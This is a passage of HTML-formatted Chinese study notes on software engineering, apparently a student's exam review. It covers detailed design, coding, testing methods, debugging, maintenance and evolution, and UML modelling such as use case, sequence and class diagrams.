tabindex="-1">（1）软件详细设计基础</h4><ul><li>详细设计的任务<ul><li>输入：软件体系结构设计、用户界面设计、软件需求</li><li>任务：对体系结构设计和用户界面设计成果进行细化和精化，获得高质量、面向实现的设计模型</li></ul></li><li>软件详细设计UML模型（活动图）</li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%AF%A6%E7%BB%86%E8%AE%BE%E8%AE%A1%E6%B4%BB%E5%8A%A8" tabindex="-1">（2）软件详细设计活动</h4><ul><li>用例设计<ul><li>任务：为需求模型中每个用例设计软件实现方案</li><li>原则：整体性、正确性、优化性等</li><li>输出：用例实现方案的交互图、设计类图</li></ul></li><li>类设计<ul><li>任务<ul><li>对界面类、关键设计类、设计类等进行设计优化和精化，</li><li>明确设计类的内部实现细节</li><li>精化到可以提交软件实现的程度</li></ul></li><li>结果<ul><li>类图、状态图、活动图等</li></ul></li></ul></li><li>数据设计<ul><li>任务<ul><li>设计需要持久保存的数据以及这些数据之间的关系</li><li>数据组织方式（例如关系数据库中的表、关键字、外键等）之间进行映射</li><li>为提高数据存储、操作性能而设计持久存储机制优化设施</li></ul></li><li>设计与建模<ul><li>设计数据的结构、存储、组织和访问</li><li>对数据设计的结果进行建模</li></ul></li></ul></li><li>子系统<ul><li>任务<ul><li>确定子系统内部结构，设置包含于其中的更小粒度子系统、构件和设计类，明确它们之间的协作关系</li><li>确保它们能够协同实现子系统接口规定的所有功能和行为</li></ul></li></ul></li><li>构件设计<ul><li>任务<ul><li>定义构件内部的设计元素及其协作方法</li><li>内部设计元素可以是子构件，也可以是粒度更细的类</li></ul></li></ul></li></ul><h3 id="5-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E6%95%B4%E5%90%88%E3%80%81%E9%AA%8C%E8%AF%81%E5%8F%8A%E8%AF%84%E5%AE%A1" tabindex="-1">5 软件设计整合、验证及评审</h3><ul><li>设计整合<ul><li>汇总迄今获得的所有设计模型<ul><li>包括体系结构模型、界面设计模型、用例设计模型、子系统/构件/类设计模型、数据模型等</li></ul></li><li>形成系统、完整的软件设计方案</li></ul></li><li>设计验证<ul><li>验证整个设计的正确性、优化性和充分性等</li><li>验证设计模型之间的不一致性、冗余性等</li><li>发现设计方案中的问题并进行整改</li></ul></li></ul><h2 id="%E7%AC%AC%E4%B8%83%E7%AB%A0-%E8%BD%AF%E4%BB%B6%E5%AE%9E%E7%8E%B0%E5%92%8C%E6%B5%8B%E8%AF%95" tabindex="-1">第七章 软件实现和测试</h2><h3 id="1-%E8%BD%AF%E4%BB%B6%E5%AE%9E%E7%8E%B0" tabindex="-1">1 软件实现</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E5%AE%9E%E7%8E%B0%E6%A6%82%E8%BF%B0" tabindex="-1">（1）软件实现概述</h4><ul><li><p>软件实现的任务</p><ul><li>根据软件设计模型（包括体系结构设计模型、用户界面设计模型和详细设计模型），采用编程语言编写出目标软件系统的程序代码，并对代码进行必要的测试，以发现和纠正代码存在中的缺陷，并将可运行的目标代码部署到目标计算机上运行<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%BD%AF%E4%BB%B6%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B.jpg" alt></li></ul></li><li><p>这三项工作均由程序员负责完成</p><ul><li>编码：基于软件设计模型和文档，采用选定的程序设计语言，编写出目标软件系统的程序代码</li><li>单元测试：对自己编写的各个基本模块进行单元测试，以发现模块单元中存在的缺陷和问题</li><li>调试：发现产生缺陷原因，定位缺陷位置，进而对代码缺陷进行修复</li></ul></li><li><p>软件测试由软件测试工程师完成</p></li></ul><h4 id="%EF%BC%882%EF%BC%89%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E7%B1%BB%E5%9E%8B%E5%92%8C%E9%80%89%E6%8B%A9" tabindex="-1">（2）编程语言的类型和选择</h4><ul><li>选择<ul><li>软件的应用领域<ul><li>不同应用领域的软件通常会选择不同的程序设计语言来加以实现</li><li>科学和工程计算领域选用Fortran、C等程序设计语言，数据库应用软件开发会选用Delphi、Visual Basic、SQL等程序设计语言，机器人等嵌入式应用选用C、C++、Python等程序设计语言，互联网应用开发选用Java、ASP等程序设计语言</li></ul></li><li>与遗留软件系统的交互</li><li>软件的特殊功能及需求<ul><li>是否需要与底层的硬件系统进行交互，如果需要，可以考虑采用诸如C、汇编语言</li><li>是否需要丰富的软件库来支持功能的实现，如果需要，可以考虑具有丰富软件库的编程语言，如Python、Java等</li><li>是否需要对相关的知识进行表示和推理，如果需要，可以考虑选用描述性的程序设计语言，如Prolog、Lisp等</li></ul></li><li>软件的目标平台<ul><li>如果目标软件系统需要部署在J2EE架构之上，那么就需要选择Java编程语言；如果需要借助于ROS来开发机器人软件，那么建议选择C、C++和Python等编程语言</li></ul></li><li>程序员的编程经验</li></ul></li></ul><h3 id="2-%E7%BC%96%E7%A0%81" tabindex="-1">2 编码</h3><h4 id="%EF%BC%881%EF%BC%89%E7%BC%96%E7%A0%81%E6%A6%82%E8%BF%B0" tabindex="-1">（1）编码概述</h4><ul><li>编码的原则<ul><li>易读，一看就懂</li><li>易改，便于维护</li><li>降低代码的复杂度</li><li>尽可能地开展软件重用和编写可重用的程序代码</li><li>要有处理异常和提高代码的容错性</li><li>代码要与模型和文档相一致</li></ul></li><li>遵循编码风格</li></ul><h4 id="%EF%BC%882%EF%BC%89%E7%BC%96%E7%A0%81%E8%BF%87%E7%A8%8B" tabindex="-1">（2）编码过程</h4><ul><li>编写类代码<ul><li>编写实现类的代码</li><li>编写实现类方法的代码</li><li>编写实现类间关联的代码</li><li>编写实现设计类间聚合和组合关系的代码</li><li>编写实现接口关系的代码</li><li>编写实现继承关系的程序代码</li><li>编写实现包的代码</li></ul></li><li>编写用户界面代码</li><li>代码片段的重用</li></ul><h4 id="%EF%BC%883%EF%BC%89%E7%BC%BA%E9%99%B7" tabindex="-1">（3）缺陷</h4><ul><li>软件缺陷是指软件制品中存在不正确的软件描述和实现</li></ul><h3 id="3-%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95" tabindex="-1">3 软件测试</h3><h4 id="%EF%BC%881%EF%BC%89%E6%B5%8B%E8%AF%95%E6%A6%82%E8%BF%B0" tabindex="-1">（1）测试概述</h4><ul><li>软件缺陷不可避免</li><li>如何应对缺陷？<ul><li>预防缺陷</li><li>容忍缺陷</li><li>发现缺陷</li><li>修复缺陷</li></ul></li><li>何为软件测试<ul><li>运行软件或模拟软件的执行，发现软件缺陷的过程——缺陷测试</li><li>向开发人员和客户展示软件的有效性——确认测试</li></ul></li><li>软件测试的原理<ul><li>程序本质上是对数据的处理<ul><li>设计数据(测试用例) -&gt; 运行测试用例(程序来处理数据) -&gt; 判断运行结果(是否符合预期结果)</li></ul></li></ul></li><li>测试执行的步骤<ul><li><ol><li>明确待测试对象</li></ol></li><li><ol start="2"><li>设计测试用例</li></ol></li><li><ol start="3"><li>运行代码和测试用例</li></ol></li><li><ol start="4"><li>分析运行结果</li></ol></li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E8%AE%BE%E8%AE%A1" tabindex="-1">（2）测试用例设计</h4><ul><li><p>测试用例是一个四元偶</p><ul><li>输入数据：交由待测试程序代码进行处理的数据</li><li>前置条件：程序处理输入数据的运行上下文，即要满足前置条件</li><li>测试步骤：程序代码对输入数据的处理可能涉及到一系列的步骤，其中的某些步骤需要用户的进一步输入</li><li>预期输出：程序代码的预期输出结果</li></ul></li><li><p>白盒测试技术：基于程序内部的执行流程来设计测试用例</p><ul><li>特点：必须了解程序的内部工作流程才能设计测试用例</li><li>基本路径测试<ul><li><ol><li>根据程序逻辑画出流程图</li></ol></li><li><ol start="2"><li>将流程图转换为流图</li></ol></li><li><ol start="3"><li>确定基本路径集合</li></ol></li><li><ol start="4"><li>针对测试路径设计测试用例</li></ol></li></ul></li></ul></li><li><p>黑盒测试技术：基于程序的外在功能和接口来设计测试用例</p><ul><li>特点：<ul><li>知道程序功能和性能，不必了解程序内部结构和处理细节</li><li>黑盒测试与软件如何实现无关，如果软件实现发生变化，测试用例仍然可以使用</li><li>黑盒测试用例的开发可以与软件开发并行进行，能够缩短软件开发周期</li></ul></li><li>方法：<ul><li>等价分类法<ul><li>思想<ul><li>把程序的输入数据集合按输入条件划分为若干个等价类</li><li>每一个等价类对于输入条件而言是等价的</li><li>为每一个等价类设计一个测试用例，包括有效或无效的输入</li></ul></li><li>优点<ul><li>可以滤掉同类数据，减少测试次数，不丢失发现错误的机会</li></ul></li></ul></li><li>边界值分析法</li></ul></li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E7%AD%96%E7%95%A5" tabindex="-1">（3）软件测试的过程和策略</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%92%8C%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E5%85%B3%E7%B3%BB.jpg" alt></p><ul><li><p>单元测试</p><ul><li>测试对象<ul><li>对软件基本模块单元进行测试</li><li>过程、函数、方法、类</li></ul></li><li>测试方法：大多采用白盒测试技术</li></ul></li><li><p>集成测试</p><ul><li>测试对象<ul><li>对软件模块之间的接口进行测试</li><li>过程调用、函数调用、消息传递、远程过程调用</li></ul></li><li>测试技术：采用黑盒测试技术</li></ul></li><li><p>确认测试</p><ul><li>测试对象<ul><li>对软件的功能和性能进行测试</li><li>判断目标软件系统是否满足用户需求</li></ul></li><li>依据和标准<ul><li>软件需求规格说明书</li></ul></li><li>测试技术：采用黑盒测试技术</li></ul></li><li><p>α测试</p><ul><li>软件开发公司组织内部人员模拟各类用户行为对即将面市的软件产品（称为α版本、内部测试版）进行测试，发现错误并修正</li><li>尽可能逼真地模拟实际运行环境和用户对软件产品的操作，并尽最大努力涵盖所有可能的用户操作方式</li><li>经α测试并进行修改后的软件产品称为β版本（也称外部测试版）</li></ul></li><li><p>β测试</p><ul><li>软件开发公司组织各方面的典型用户在日常工作中实际使用β版本，或为对外进行宣传而将β版本免费赠送给典型用户（很多情况下，β版本可以通过Internet免费下载，也可以向软件公司索取），并要求用户报告异常情况、提出批评意见</li><li>β测试是在与开发者无法控制的环境下进行的软件现场应用</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95" tabindex="-1">（4）面向对象软件测试</h4><ul><li>OO软件的构成基础与传统结构化程序设计不同</li><li>需要开发测试驱动程序</li><li>采用白盒测试方法</li></ul><h4 id="%EF%BC%885%EF%BC%89%E9%9D%9E%E5%8A%9F%E8%83%BD%E6%80%A7%E6%B5%8B%E8%AF%95" tabindex="-1">（5）非功能性测试</h4><ul><li>性能测试</li><li>强度测试</li><li>配置和兼容性测试</li><li>安全性测试</li><li>可靠性测试</li><li>用户界面测试</li><li>本地化测试</li><li>Web测试</li><li>安装测试</li></ul><h3 id="4-%E8%BD%AF%E4%BB%B6%E8%B0%83%E8%AF%95" tabindex="-1">4 软件调试</h3><ul><li>软件调试就是要基于程序代码，确定软件缺陷的原因、定位缺陷的位置，从而知道那里错了、如何修复缺陷</li><li>目的<ul><li>测试发现缺陷</li><li>调试定位缺陷</li><li>排错纠正错误</li></ul></li><li>独立性不同<ul><li>测试由独立的测试小组进行</li><li>调试和排错由开发人员完成<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%B0%83%E8%AF%95%E7%9A%84%E6%AD%A5%E9%AA%A4.jpg" alt></li></ul></li></ul><h2 id="%E7%AC%AC%E5%85%AB%E7%AB%A0-%E8%BD%AF%E4%BB%B6%E7%BB%B4%E6%8A%A4%E5%92%8C%E6%BC%94%E5%8C%96" tabindex="-1">第八章 软件维护和演化</h2><h3 id="1.-%E8%BD%AF%E4%BB%B6%E7%BB%B4%E6%8A%A4%E4%B8%8E%E6%BC%94%E5%8C%96" tabindex="-1">1. 软件维护与演化</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%BB%B4%E6%8A%A4" tabindex="-1">（1）软件维护</h4><ul><li><p>软件变更和修改是不可避免的</p><ul><li>待修复的错误</li><li>需求的变更/新的需求</li><li>技术和商务环境变化</li><li>系统的性能或可靠性等需要改进</li><li>系统中增加了新的计算机和设备</li></ul></li><li><p>软件需要进行维护</p><ul><li>出故障，不可正常工作</li><li>服务变化，需要升级</li><li>运行环境变化，需要适应</li></ul></li><li><p>软件维护：软件在交付使用后，由于应用需求和环境变化以及自身问题，对软件系统进行改造和调整的过程</p></li><li><p>维护形式：</p><ul><li>纠正性维护：纠正软件中的缺陷和错误</li><li>完善性维护：对软件进行改造以增加新的功能、修改已有的功能</li><li>适应性维护：对软件进行改造以便适应新的运行环境和平台</li><li>预防性维护：对软件结构进行改造以便提高软件的可靠性和可维护性等</li></ul></li><li><p>软件维护工程师</p></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E6%BC%94%E5%8C%96" tabindex="-1">（2）软件演化</h4><ul><li>特点：软件演化与开发是一个集成的、完整的、增量式的过程，可以用螺旋模型表示。主要针对软件的大规模功能增强和结构调整，以实现变化的软件需求，或者提高软件系统的质量。</li></ul><table><thead><tr><th>概念</th><th>功能增强粒度</th><th>应对变化方式</th><th>持续性或间隔性</th><th>版本变化</th></tr></thead><tbody><tr><td>软件演化</td><td>粗粒度</td><td>主动</td><td>持续性</td><td>是</td></tr><tr><td>软件维护</td><td>细粒度</td><td>被动</td><td>间隔性</td><td>不一定</td></tr></tbody></table><ul><li>软件演化法则<ul><li>持续变化法则</li><li>增加复杂性法则</li><li>自我调节法则</li><li>组织稳定性守恒法则</li><li>熟悉度守恒法则</li><li>功能持续增长法则</li><li>质量衰减法则</li><li>反馈系统法则</li></ul></li></ul><h3 id="2.-%E8%BD%AF%E4%BB%B6%E9%80%BB%E8%BE%91%E8%80%81%E5%8C%96" tabindex="-1">2. 软件逻辑老化</h3><h4 id="%EF%BC%881%EF%BC%89%E9%80%BB%E8%BE%91%E8%80%81%E5%8C%96%E7%9A%84%E7%89%B9%E7%82%B9" tabindex="-1">（1）逻辑老化的特点</h4><ul><li>何为逻辑老化<ul><li>软件在维护和演化的过程中出现的用户满意度降低、质量逐渐下降、变更成本不断上升这样一种现象</li></ul></li><li>软件逻辑老化的现象<ul><li>质量下降</li><li>变更成本增加</li><li>用户满意度降低</li></ul></li><li>软件逻辑老化的原因<ul><li>缺乏变更</li><li>负面变更</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%A7%A3%E5%86%B3%E9%80%BB%E8%BE%91%E8%80%81%E5%8C%96%E7%9A%84%E6%96%B9%E6%B3%95" tabindex="-1">（2）解决逻辑老化的方法</h4><p>逻辑老化软件的维护和升级将会收到预算、期限等多种因素的约束，因此维护团队需要对逻辑老化软件基于其质量（失效率和可维护性等）及其业务价值（系统的使用情况、支持的业务流程、系统的可靠性、输出的价值）进行评估，再做出适当决策。</p><h3 id="3.-%E8%BD%AF%E4%BB%B6%E7%BB%B4%E6%8A%A4%E7%9A%84%E8%BF%87%E7%A8%8B%E4%B8%8E%E6%8A%80%E6%9C%AF" tabindex="-1">3. 软件维护的过程与技术</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%BB%B4%E6%8A%A4%E6%8A%80%E6%9C%AF" tabindex="-1">（1）软件维护技术</h4><ul><li>代码重组：在不改变软件功能的前提下，对程序代码进行重新组织，使得重组后的代码具有更好的可维护性，能够有效支持对代码的变更</li><li>逆向工程：基于低抽象层次软件制品，通过对其进行理解和分析，产生高抽象层次的软件制品</li><li>设计重构</li><li>再工程</li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%BB%B4%E6%8A%A4%E8%BF%87%E7%A8%8B" tabindex="-1">（2）软件维护过程</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%BD%AF%E4%BB%B6%E7%BB%B4%E6%8A%A4%E8%BF%87%E7%A8%8B.jpg" alt></p><ul><li>软件维护需要解决的问题<ul><li>人员的问题</li><li>软件制品的问题</li><li>维护副作用的问题</li><li>维护成本不断增加的问题</li></ul></li></ul><h2 id="%E5%A4%8D%E4%B9%A0%E9%87%8D%E7%82%B9" tabindex="-1">复习重点</h2><h3 id="%E7%BB%93%E6%9E%84%E5%8C%96%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95" tabindex="-1">结构化需求分析方法</h3><ul><li>基本思想：数据主义认为，整个宇宙都是由数据流构成的，各个数据处理系统构成人类的社会</li><li>数据流图<ul><li>Data Flow Diagram(简称DFD)：描述输入数据流到输出数据流的变换(即加工)过程，用于对系统的功能建模</li><li>基本元素<img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/5_1_2_1_1.jpg" alt></li></ul></li><li>画分层数据流图的步骤<ul><li><ol><li>画系统的输入和输出</li></ol></li><li><ol start="2"><li>画系统内部</li></ol></li><li><ol start="3"><li>画加工内部</li></ol></li><li><ol start="4"><li>根据自顶向下逐层分解的思想，重复第3步，继续分解加工，直至每个尚未分解的加工都足够简单(即不必再分解)</li></ol></li></ul></li><li>分层数据流图示例——空巢老人看护系统<ul><li>确定源或宿：老人、家属、医生、机器人和时钟<ul><li>除了时钟外，都既是源又是宿</li></ul></li><li>顶层图唯一的加工：软件系统(空巢老人看护系统)</li><li>确定数据流：系统的输入/输出信息<ul><li>输入数据流：老人的呼叫、家属和医生的控制命令、老人的图像和视频、定时器</li><li>输出数据流：家属和医生的语音和视频、异常状态和警告信息、机器人执行指令</li></ul></li><li>顶层图通常没有文件<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%BD%AF%E5%B7%A5%E9%A1%B6%E5%B1%82%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE.jpg" alt><br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E8%BD%AF%E5%B7%A5%E6%80%BB%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE.jpg" alt></li></ul></li></ul><h3 id="%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95" tabindex="-1">面向对象需求分析方法</h3><ul><li><p>基本思想:现实世界（应用问题）还是计算机世界（软件系统），它们都是由多样化的对象所构成的，每个对象都有其状态并可提供功能和服务，不同对象之间通过交互来开展协作来实现功能和提供服务</p></li><li><p>面向对象软件工程提供对象、类、属性、操作、消息、继承等概念来抽象表示现实世界的应用，分析其软件需求特征，建立起软件需求模型，描述软件需求</p></li><li><p>面向对象建模语言</p><ul><li>概念:基于面向对象的概念和抽象，提供图形化的图符，用来表示软件系统的一种语言</li><li>示例：<img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E9%A1%BA%E5%BA%8F%E5%9B%BE.jpg" alt></li></ul></li><li><p>UML: Unified Modeling Language</p><ul><li>Unified(统一)<ul><li>提取不同方法中最好建模技术，如OMT(James Rumbaugh)，Booch method(Grady Booch )和OOSE(Ivar Jacobson)</li><li>采用统一、标准化的表示方式</li></ul></li><li>Modeling(建模)<ul><li>对现实系统和软件系统进行可视化建模</li><li>建立系统模型</li></ul></li><li>Language(语言)<ul><li>图形化语言：语法、语义和语用<ul><li>包括规则，约束 扩展机制</li></ul></li></ul></li><li>UML用途：用来可视化(visualize) 、描述(specify)、构造(construct)和文档化(document)软件密集型系统的各种产品</li></ul></li><li><p>多视点建模</p><ul><li>结构视点（Structural View）<ul><li>用于描述系统的构成</li><li>UML提供了包图（Package Diagram）、类图（Class Diagram）、对象图（Object Diagram）和构件图（Component Diagram），从不同的抽象层次来表示系统的静态组织及结构</li></ul></li><li>行为视点（Behavioral View）<ul><li>刻画系统的行为</li><li>UML提供了交互图（Interaction Diagram）、状态图（Statechart Diagram）与活动图（Activity Diagram），以从不同侧面刻画系统的动态行为。</li></ul></li><li>部署视点（Deployment View）<ul><li>刻画目标软件系统的软件制品及其运行环境</li><li>UML提供了部署图（Deployment Diagram）来描述软件系统的部署模型</li></ul></li><li>用例视点（Use Case View）<ul><li>刻画系统的功能</li><li>UML提供了用例图（Use Case Diagram）以描述系统的用例及其与外部执行者之间的关系。<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%BB%BA%E6%A8%A1%E8%AF%95%E7%82%B9%E5%9B%BE.jpg" alt></li></ul></li></ul></li><li><p>面向对象需求分析步骤</p><ul><li>明确问题边界，获取软件需求，建立用例模型</li><li>开展用例分析，精化软件需求，建立分析模型</li><li>汇总需求模型，撰写需求文档，评审软件需求</li></ul></li></ul><h3 id="%E7%94%A8%E4%BE%8B%E5%9B%BE%E6%8F%8F%E8%BF%B0" tabindex="-1">用例图描述</h3><ul><li><p>用例图用来描述初步软件需求</p></li><li><p>图的构成</p><ul><li>执行者<ul><li>系统之外的实体，他们使用软件系统功能、与软件系统交换信息</li><li>可以是一类用户，也可以是其他软件系统或物理设备</li></ul></li><li>用例<ul><li>表示执行者为达成一项相对独立、完整的业务目标而要求软件系统完成的功能</li></ul></li><li>边：执行者与用例间、用例之间、执行者之间的关系<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E6%89%A7%E8%A1%8C%E8%80%85%E4%B8%8E%E7%94%A8%E4%BE%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB.jpg" alt></li></ul></li><li><p>用例间的关系</p><ul><li>用例间的关系-包含关系<ul><li>如果用例B是用例A的某项子功能，则称用例A包含用例B</li></ul></li><li>用例间的关系-扩展关系<ul><li>如果用例A与B相似，但A的功能较B多，A的动作序列是在B的动作序列中的某些执行点上插入附加动作序列而构成的，则称用例A扩展用例B</li></ul></li><li>用例间的关系-继承<ul><li>如果A与B相似，但A的动作序列是通过改写B的部分动作或者扩展B的动作而获得的，则称用例A继承用例B<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E7%94%A8%E4%BE%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB.jpg" alt></li></ul></li><li>边界框<ul><li>表示整个软件系统或子系统的边界<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E7%A9%BA%E5%B7%A2%E8%80%81%E4%BA%BA%E7%9C%8B%E6%8A%A4%E8%BD%AF%E4%BB%B6%E7%94%A8%E4%BE%8B%E5%9B%BE.jpg" alt></li></ul></li></ul></li></ul><h3 id="uml%E4%BA%A4%E4%BA%92%E5%9B%BE" tabindex="-1">UML交互图</h3><ul><li><p>作用：刻画对象间的消息传递，分析如何通过交互协作完成功能</p><ul><li>用例的功能实现方式</li><li>软件系统在某种使用场景下对象间的交互协作流程</li><li>软件系统的某个复杂操作的逻辑实现模型</li></ul></li><li><p>二类交互图</p><ul><li>顺序图(Sequence Diagram)：强调消息传递的时间序</li><li>通信图(Communication Diagram)：突出对象间的合作</li><li>顺序图和通信图语义上等价，没必要针对同一建模目标同时创建这二个图</li></ul></li><li><p>顺序图：描述对象间的消息交互序列</p><ul><li>纵向：时间轴，对象及其生命线(虚线)，活跃期(长条矩形)</li><li>横向：对象间的消息传递<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E4%BA%A4%E4%BA%92%E5%9B%BE%E4%B9%8B%E9%A1%BA%E5%BA%8F%E5%9B%BE.jpg" alt></li></ul></li></ul><h3 id="%E7%B1%BB%E5%9B%BE" tabindex="-1">类图</h3><ul><li>功效：描述系统的类构成，刻画系统的静态组成结构</li><li>图的构成<ul><li>结点：表示系统中的类（或接口）及其属性和操作</li><li>边：类之间的关系</li></ul></li><li>类的表示<img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E7%B1%BB%E7%9A%84%E8%A1%A8%E7%A4%BA.jpg" alt></li><li>属性的表示：<ul><li>[可见性] 名称 [: 类型] [多重性] [= 初值]  [{约束特性}]</li><li>可见性<ul><li>公开(+): 所有对象均可访问</li><li>保护(#): 所在类及子类对象均可访问</li><li>私有(-): 仅所在类的对象才可访问</li></ul></li><li>多重性：属性取值数量, 如1，0…1，0…* ，1…<em>，</em></li><li>约束特性<ul><li changeable>可更改性：{readOnly}表示只读，缺省为</li><li unordered>顺序性： {ordered}表示属性取值是有序的，缺省为</li><li>唯一性： {bag}表示属性取值元素允许出现重复元素（缺省）</li><li>静态性：{static}表示静态属性，属性值由类所有实例对象共享</li></ul></li></ul></li><li>方法的表示<ul><li>[可见性]  名称[(参数表)] [: 返回类型] [{约束特性}]</li><li>操作的约束特性<ul><li>查询操作： {isQuery = true}表示查询操作，{ isQuery = false}表示修改操作，缺省为修改操作。</li><li>多态性：{isPolymorphic = true}表示本操作允许多态，即可被子类中相同定义形式的操作所覆盖</li><li>并发性：{concurrency = sequential} 任一时刻只有一个对象调用可执行。{concurrency = guarded} 并行线程可同时调用多个对象的本操作，但同一时刻只允许一个调用执行。{concurrency = concurrent} 并行线程可以同时调用多个对象的本操作且这些调用可并发执行</li><li>异常：操作在执行过程中可能引发异常</li></ul></li></ul></li><li>接口<ul><li>一种不包含操作实现部分的特殊类</li><li>接口的形式<ul><li>供给接口: 对外提供的接口</li><li>需求接口: 需要使用的接口</li></ul></li></ul></li><li>类间的关系<ul><li>关联</li><li>依赖</li><li>集成</li><li>实现</li><li>聚合</li><li>组成</li></ul></li><li>类图注意事项<ul><li>用单数名词来描述类名，少用缩写</li><li>按照方向表示类间关系<ul><li>垂直方向表示继承关系</li><li>水平方向表示关联、聚合、组合、依赖、实现关系</li></ul></li><li>注意画图位置<ul><li>关联名应位于关联边的居中位置</li><li>多重性、角色名、约束特性等应靠近关联端</li></ul></li></ul></li></ul><h3 id="%E5%88%86%E6%9E%90%E5%92%8C%E5%BB%BA%E7%AB%8B%E7%94%A8%E4%BE%8B%E7%9A%84%E4%BA%A4%E4%BA%92%E6%A8%A1%E5%9E%8B" tabindex="-1">分析和建立用例的交互模型</h3><ul><li><p>任务:分析和描述用例是如何通过一组对象之间的交互来完成的</p></li><li><p>步骤</p><ul><li>分析和确定用例所涉及的对象及其类</li><li>分析和确定对象之间的消息传递</li><li>绘制用例的交互图</li></ul></li><li><p>软件需求用例的处理通常涉及三种不同类对象:边界类，控制类，实体类</p></li><li></li><li><p>边界类</p><ul><li>定义：由于这些类对象处于系统的边界，需与系统外的执行者进行交互，因而将这些对象所对应的类称之为边界类</li><li>作用<ul><li>交互控制，处理外部执行者的输入数据，或者向外部执行者输出数据</li><li>外部接口，如果外部执行者表现为其他的系统或者设备，那么边界类对象需要与系统之外的其他系统或设备进行信息交互</li></ul></li></ul></li><li><p>控制类</p><ul><li>控制类对象作为完成用例任务的主要协调者</li><li>一般而言，控制类并不负责处理具体的任务细节，而是负责分解任务，并通过消息传递将任务分派给其他对象类来完成，协调这些对象之间的信息交互</li></ul></li><li><p>实体类</p><ul><li>用例所对应业务流程中的所有具体功能最终要交由具体的类对象来完成，这些类称之为实体类<br><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/%E7%94%A8%E4%BE%8B%E7%9A%84%E4%BA%A4%E4%BA%92%E6%A8%A1%E5%9E%8B.jpg" 